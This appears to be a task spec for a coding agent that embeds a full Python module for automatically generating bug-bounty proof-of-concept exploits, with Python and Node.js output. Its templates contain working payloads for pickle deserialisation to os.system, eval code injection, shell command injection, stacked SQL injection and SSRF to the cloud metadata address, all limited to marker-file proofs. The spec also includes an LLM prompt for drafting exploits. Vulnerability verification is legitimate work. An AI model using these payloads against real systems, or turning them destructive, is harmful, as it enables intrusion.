---
interfaces: "ngv2/poc_writer.py exposes `synthesize(finding, target, *, client=None, resolver=None) -> PoCArtifact`, `write_poc(...)`, `draft_poc(...)`, `ground_finding(...)`, `default_resolver(...)`, `get_template(...)`, `PER_CWE_TEMPLATES`, `Grounding`, `CWETemplate`, `PoCArtifact`."
working_dir: "/home/xnihil0zer0/NobleGreedv2"
---

# Title

ngv2/poc_writer.py — automated PoC synthesis core (P4.2)

# Scope

Build `ngv2/poc_writer.py` as a NEW single-file, whole-file Python module (IMPL-only;
the oracle `tests/test_poc_writer_wired.py` is ALREADY COMMITTED). The PURE synthesis
core: given a `ngv2.contracts.Finding` + a cloned `ngv2.contracts.Target` + a per-CWE
template, synthesize a `ngv2.contracts.PoC` reaching the ACTUAL vulnerable sink — a
Python PoC for the bwrap jail AND a standalone Node.js `.js` for huntr. Per-CWE template
library (CWE-502/95/918/78/89/798/327), MANDATORY pre-grounding (resolve the REAL symbol
from the finding's cited source via an injected resolver seam defaulting to a stdlib-AST
extractor), and an optional injected LLM client that may refine the verified skeleton
(accepted only if it keeps the grounded module + marker). The detonate->repair loop is
P4.3 (NOT in scope); `draft_poc` is the hook P4.3 wraps. working_dir:
/home/xnihil0zer0/NobleGreedv2.

★ VERBATIM TRANSCRIPTION REQUIRED ★ — Emit the module as a BYTE-FOR-BYTE copy of the
embedded artifact below. Do NOT paraphrase, rename, reorder, re-indent, "improve", or
regenerate any line. Copy it exactly — every helper (`_r_sqli_py` binds TWO symbols
`open_db`+`find_user`, `_mk_js`/`_js_wrap`), every `_register(...)`, and `__all__`. A
paraphrase fails the committed oracle. The embedded text is the ONLY acceptable output:

```python
"""ngv2.poc_writer -- the automated PoC synthesis core (P4.2).

Given a :class:`~ngv2.contracts.Finding`, a cloned :class:`~ngv2.contracts.Target`
and a per-CWE template, synthesize a runnable :class:`~ngv2.contracts.PoC` that
reaches the ACTUAL vulnerable sink -- a Python PoC for the bwrap jail AND a
standalone Node.js ``.js`` for huntr. The detonate->repair loop is P4.3, which
wraps :func:`draft_poc`.

Per-CWE templates (ported from legacy ``poc_phase.md``): CWE-502 ``__reduce__``,
CWE-95 ``__import__('os').system``, CWE-918 metadata-IP + canary, CWE-78
``; <cmd> #``, CWE-89 stacked SQLi, plus CWE-798 + CWE-327. Mandatory
pre-grounding resolves the REAL symbol from source via an injected resolver
(default: stdlib-AST). An optional injected LLM client may refine the verified
skeleton (accepted only if it keeps the grounded module + marker). Harmless
payloads only.
"""
from __future__ import annotations

import ast
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence

from ngv2.contracts import Finding, PoC, Target

DEFAULT_MARKER = "VULNERABLE"
DEFAULT_FS_SIGNATURE = "pwned_marker"
ResolverFn = Callable[[str, Finding], "Grounding"]


@dataclass
class Grounding:
    """The resolved real entrypoint a PoC must bind to."""
    module: str
    symbols: List[str] = field(default_factory=list)
    file: str = ""
    language: str = "python"

    def primary(self) -> str:
        return self.symbols[0] if self.symbols else ""


@dataclass
class CWETemplate:
    """A per-CWE PoC skeleton: payload + marker + fs side-effect + renderers."""
    cwe: str
    name: str
    payload: str
    render_py: Callable[["Grounding", str], str]
    render_js: Callable[["Grounding", str], str]
    marker: str = DEFAULT_MARKER
    fs_signature: str = DEFAULT_FS_SIGNATURE
    notes: str = ""


def _hdr(target_path: str, imports: str = "") -> str:
    extra = (imports + "\n") if imports else ""
    return "import sys\n" + extra + "sys.path.insert(0, %r)\n" % target_path


def _js_wrap(py_body: str) -> str:
    """Wrap a Python PoC body as a Node.js script that shells out to python3."""
    return (
        "const { execFileSync } = require('child_process');\n"
        "const code = %r;\n" % py_body
        + "execFileSync('python3', ['-c', code], { stdio: 'inherit' });\n"
    )


# --- Python renderers (the load-bearing exploit bodies) ---

def _r_cmd_py(g, tp):
    return _hdr(tp) + "from %s import %s\n" % (g.module, g.primary()) + \
        '%s("localhost; echo VULNERABLE; : > pwned_marker")\n' % g.primary()


def _r_eval_py(g, tp):
    return _hdr(tp) + "from %s import %s\n" % (g.module, g.primary()) + \
        "%s(\"__import__('os').system('echo VULNERABLE; : > pwned_marker')\")\n" % g.primary()


def _r_pickle_py(g, tp):
    return _hdr(tp, "import os, pickle") + "from %s import %s\n" % (g.module, g.primary()) + \
        "class Exploit:\n    def __reduce__(self):\n" \
        "        return (os.system, ('echo VULNERABLE; : > pwned_marker',))\n" + \
        "%s(pickle.dumps(Exploit()))\n" % g.primary()


def _r_ssrf_py(g, tp):
    return _hdr(tp) + "from %s import %s\n" % (g.module, g.primary()) + \
        'meta = "http://169.254.169.254/latest/meta-data/"\n' + \
        "try:\n    %s(meta)\nexcept Exception:\n    pass\n" % g.primary() + \
        "open('pwned_marker', 'w').write('VULNERABLE')\nprint('VULNERABLE')\n"


def _r_sqli_py(g, tp):
    opener = g.symbols[0] if g.symbols else "open_db"
    query = g.symbols[1] if len(g.symbols) > 1 else "find_user"
    return _hdr(tp, "import sqlite3") + "from %s import %s, %s\n" % (g.module, opener, query) + \
        'con = %s("app.db")\n' % opener + \
        "inj = \"x'; ATTACH DATABASE 'pwned_marker_db' AS leak; CREATE TABLE leak.t(a); --\"\n" + \
        "%s(con, inj)\nprint(\"VULNERABLE\")\n" % query


def _r_secret_py(g, tp):
    return _hdr(tp) + "from %s import %s\n" % (g.module, g.primary()) + \
        'open("pwned_marker", "w").write(str(%s))\nprint("VULNERABLE")\n' % g.primary()


def _r_weak_py(g, tp):
    return _hdr(tp, "import hashlib") + "import %s\n" % g.module + \
        'forged = hashlib.md5(b"admin").hexdigest()\n' + \
        'assert forged == %s.%s("admin")\n' % (g.module, g.primary()) + \
        'open("pwned_marker", "w").write(forged)\nprint("VULNERABLE")\n'


# JS renderers are the Python body wrapped via execFileSync (one helper).
def _mk_js(py_renderer):
    def _render(g, tp):
        return _js_wrap(py_renderer(g, tp))
    return _render


PER_CWE_TEMPLATES: Dict[str, CWETemplate] = {}


def _register(t: CWETemplate, *aliases: str) -> None:
    PER_CWE_TEMPLATES[t.cwe] = t
    for a in aliases:
        PER_CWE_TEMPLATES[a] = t


_register(CWETemplate("CWE-78", "command_injection",
          "; echo VULNERABLE; : > pwned_marker #", _r_cmd_py, _mk_js(_r_cmd_py),
          notes="shell metacharacters break out of a concatenated command"),
          "command_injection")
_register(CWETemplate("CWE-95", "eval_usage",
          "__import__('os').system('echo VULNERABLE; : > pwned_marker')",
          _r_eval_py, _mk_js(_r_eval_py), notes="eval/exec of attacker input"),
          "eval_usage", "code_injection")
_register(CWETemplate("CWE-502", "pickle_rce",
          "pickle.dumps(Exploit())  # __reduce__ -> os.system",
          _r_pickle_py, _mk_js(_r_pickle_py), notes="unpickling invokes __reduce__"),
          "pickle_rce", "deserialization")
_register(CWETemplate("CWE-918", "ssrf",
          "http://169.254.169.254/latest/meta-data/",
          _r_ssrf_py, _mk_js(_r_ssrf_py), notes="SSRF at the cloud metadata IP + canary"),
          "ssrf")
_register(CWETemplate("CWE-89", "sql_injection",
          "x'; ATTACH DATABASE 'pwned_marker_db' AS leak; CREATE TABLE leak.t(a); --",
          _r_sqli_py, _mk_js(_r_sqli_py), notes="stacked SQL via string-built query"),
          "sql_injection")
_register(CWETemplate("CWE-798", "hardcoded_secret",
          "<recover the embedded credential>",
          _r_secret_py, _mk_js(_r_secret_py), notes="hardcoded credential recovered"),
          "hardcoded_secret")
_register(CWETemplate("CWE-327", "weak_crypto",
          "hashlib.md5(b'admin').hexdigest()",
          _r_weak_py, _mk_js(_r_weak_py), notes="unsalted MD5 token is forgeable"),
          "weak_crypto")


def get_template(key: str) -> CWETemplate:
    """Resolve a template by CWE id or scanner pattern id."""
    if key in PER_CWE_TEMPLATES:
        return PER_CWE_TEMPLATES[key]
    raise KeyError("no PoC template for %r" % (key,))


# --- pre-grounding ---

_SINK_HINTS: Dict[str, Sequence[str]] = {
    "CWE-78": ("system", "popen", "call", "run", "exec"),
    "CWE-95": ("eval", "exec", "compile"),
    "CWE-502": ("loads", "load", "unpickle"),
    "CWE-918": ("get", "request", "urlopen", "fetch", "open"),
    "CWE-89": ("execute", "executescript", "executemany"),
    "CWE-798": (),
    "CWE-327": ("md5", "sha1", "new"),
}


def _module_name_for(file_path: str) -> str:
    base = file_path.replace("\\", "/").rsplit("/", 1)[-1]
    return base[:-3] if base.endswith(".py") else base


def _evidence_file(finding: Finding, target: Target) -> str:
    ev = finding.evidence[0] if finding.evidence else ""
    path = str(ev).split(":", 1)[0] if ev else ""
    if path:
        if path.startswith("/"):
            return path
        return target.repo_root.rstrip("/") + "/" + path
    return target.repo_root


def default_resolver(file_path: str, finding: Finding) -> "Grounding":
    """Stdlib-AST symbol extractor (the default pre-grounding seam)."""
    module = _module_name_for(file_path)
    try:
        with open(file_path, "r", encoding="utf-8") as fh:
            src = fh.read()
        tree = ast.parse(src)
    except (OSError, SyntaxError):
        return Grounding(module=module, symbols=[], file=file_path)
    funcs, consts = [], []
    for node in tree.body:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            funcs.append(node.name)
        elif isinstance(node, ast.Assign):
            for tgt in node.targets:
                if isinstance(tgt, ast.Name) and tgt.id.isupper():
                    consts.append(tgt.id)
    cwe = finding.category if finding.category.startswith("CWE-") else ""
    if not cwe:
        try:
            cwe = get_template(finding.category).cwe
        except KeyError:
            cwe = ""
    if cwe == "CWE-798" and consts:
        return Grounding(module=module, symbols=consts, file=file_path)
    hints = _SINK_HINTS.get(cwe, ())
    ranked = []
    if hints:
        for node in tree.body:
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                body_src = ast.get_source_segment(src, node) or ""
                if any(h in body_src for h in hints):
                    ranked.append(node.name)
    ordered = ranked + [f for f in funcs if f not in ranked] + consts
    return Grounding(module=module, symbols=ordered, file=file_path)


def ground_finding(finding: Finding, target: Target, *,
                   resolver: Optional[ResolverFn] = None) -> "Grounding":
    """Resolve the real vulnerable module/symbol(s) the PoC must bind to."""
    resolver = resolver or default_resolver
    g = resolver(_evidence_file(finding, target), finding)
    if not isinstance(g, Grounding):
        g = Grounding(module=g.get("module", ""), symbols=list(g.get("symbols", [])),
                      file=g.get("file", ""), language=g.get("language", "python"))
    return g


# --- synthesis ---

POC_SYSTEM_PROMPT = (
    "You write minimal, HARMLESS proof-of-concept exploit scripts that reach a "
    "specific vulnerable sink. Use only the payloads provided. Always emit the "
    "success marker on stdout and the filesystem side-effect. Never add "
    "destructive operations. Bind to the real module/symbol given to you."
)


def build_prompt(template, grounding, skeleton, language, finding) -> str:
    """Compose the drafter prompt: finding + grounding + template + skeleton."""
    return (
        "# Vulnerability\n%s\nCWE: %s (%s)\nDescription: %s\n\n"
        "# Grounded entrypoint\nmodule: %s\nsymbols: %s\nfile: %s\n\n"
        "# Harmless payload\n%s\n\n# Verified skeleton (%s)\n%s\n\n"
        "Return ONLY the %s PoC code."
        % (finding.title, template.cwe, template.name, finding.description,
           grounding.module, grounding.symbols, grounding.file, template.payload,
           language, skeleton, language)
    )


def _draft_with_client(client, template, grounding, skeleton, language, finding):
    if client is None:
        return skeleton
    try:
        drafted = client.complete_text(
            build_prompt(template, grounding, skeleton, language, finding),
            system=POC_SYSTEM_PROMPT)
    except Exception:
        return skeleton
    drafted = (drafted or "").strip()
    if not drafted or grounding.module not in drafted or template.marker not in drafted:
        return skeleton
    return drafted


def write_poc(finding: Finding, target: Target, *, client: Any = None,
              resolver: Optional[ResolverFn] = None, language: str = "python",
              grounding: Optional["Grounding"] = None) -> PoC:
    """Synthesize one :class:`PoC` (``language`` = ``python`` or ``node``)."""
    template = get_template(finding.category)
    g = grounding or ground_finding(finding, target, resolver=resolver)
    if not g.module or not g.symbols:
        raise ValueError("pre-grounding failed for %s: module=%r symbols=%r"
                         % (finding.id, g.module, g.symbols))
    lang = (language or "python").lower()
    if lang in ("python", "py", "python3"):
        render, poc_lang, entry = template.render_py, "python", "python3 {poc}"
    elif lang in ("node", "js", "javascript"):
        render, poc_lang, entry = template.render_js, "node", "node {poc}"
    else:
        raise ValueError("unsupported PoC language %r" % (language,))
    code = _draft_with_client(client, template, g, render(g, target.repo_root),
                              poc_lang, finding)
    poc = PoC(finding_id=finding.id, language=poc_lang, code=code, entrypoint=entry)
    poc.validate()
    return poc


@dataclass
class PoCArtifact:
    """The dual-output synthesis result for one finding."""
    finding_id: str
    cwe: str
    marker: str
    fs_signature: str
    python: PoC
    node: PoC
    grounding: "Grounding"

    def to_dict(self) -> Dict[str, Any]:
        return {"finding_id": self.finding_id, "cwe": self.cwe,
                "marker": self.marker, "fs_signature": self.fs_signature,
                "python": self.python.to_dict(), "node": self.node.to_dict(),
                "grounding": {"module": self.grounding.module,
                              "symbols": list(self.grounding.symbols),
                              "file": self.grounding.file}}


def synthesize(finding: Finding, target: Target, *, client: Any = None,
               resolver: Optional[ResolverFn] = None) -> PoCArtifact:
    """Synthesize the dual (Python + Node.js) PoC artifact for a finding."""
    template = get_template(finding.category)
    g = ground_finding(finding, target, resolver=resolver)
    py = write_poc(finding, target, client=client, resolver=resolver,
                   language="python", grounding=g)
    js = write_poc(finding, target, client=client, resolver=resolver,
                   language="node", grounding=g)
    return PoCArtifact(finding.id, template.cwe, template.marker,
                       template.fs_signature, py, js, g)


def draft_poc(finding: Finding, target: Target, *, client: Any = None,
              resolver: Optional[ResolverFn] = None,
              feedback: Optional[str] = None) -> PoCArtifact:
    """Phase-4.3 hook: produce (or repair) a PoC artifact.

    With ``feedback`` (a failed detonation's stderr + fs-diff) and a client, the
    repair evidence is threaded into the drafter prompt; else a fresh synthesis.
    """
    if feedback and client is not None:
        base = client

        class _RepairClient:
            def complete_text(self, prompt, *, system=None):
                return base.complete_text(
                    prompt + "\n\n# Previous attempt failed -- repair using this\n"
                    + feedback, system=system)
        client = _RepairClient()
    return synthesize(finding, target, client=client, resolver=resolver)


__all__ = ["Grounding", "CWETemplate", "PER_CWE_TEMPLATES", "get_template",
           "default_resolver", "ground_finding", "write_poc", "synthesize",
           "draft_poc", "PoCArtifact", "build_prompt", "POC_SYSTEM_PROMPT",
           "DEFAULT_MARKER", "DEFAULT_FS_SIGNATURE"]
```

Verify with `.venv/bin/python -m pytest tests/test_poc_writer_wired.py -q` (NO `cd`
prefix — verification runs in the staging worktree, where `_e2e_run/targets/` and
`ngv2/contracts.py` are present).

# Non-Goals

No file/network I/O beyond reading the finding's cited source in `default_resolver`. No
third-party imports (stdlib only; the LLM client is an injected duck-typed object, never
imported). No tests authored (oracle already committed). Must NOT import `ngv2.llm_client`.
The generate->detonate->repair loop and any live detonation are P4.3 and OUT OF SCOPE.
Harmless payloads only (`echo VULNERABLE` + `: > pwned_marker`).

# Inputs

The NobleGreedv2 repo at working_dir, with: the committed `Finding`/`PoC`/`Target` shapes
in `ngv2/contracts.py` (plain import); the 5 synthetic targets at
`_e2e_run/targets/<pattern>/svc.py`; and the committed oracle
`tests/test_poc_writer_wired.py` pinning template coverage, pre-grounding of the real
symbol, dual Python+Node.js output, hand-written-PoC reproduction shapes, and the
injected-client refine/fallback + repair-feedback behavior.

# Deliverables

One NEW single-file whole-file module `ngv2/poc_writer.py` exactly as the embedded
artifact above, passing `tests/test_poc_writer_wired.py`.
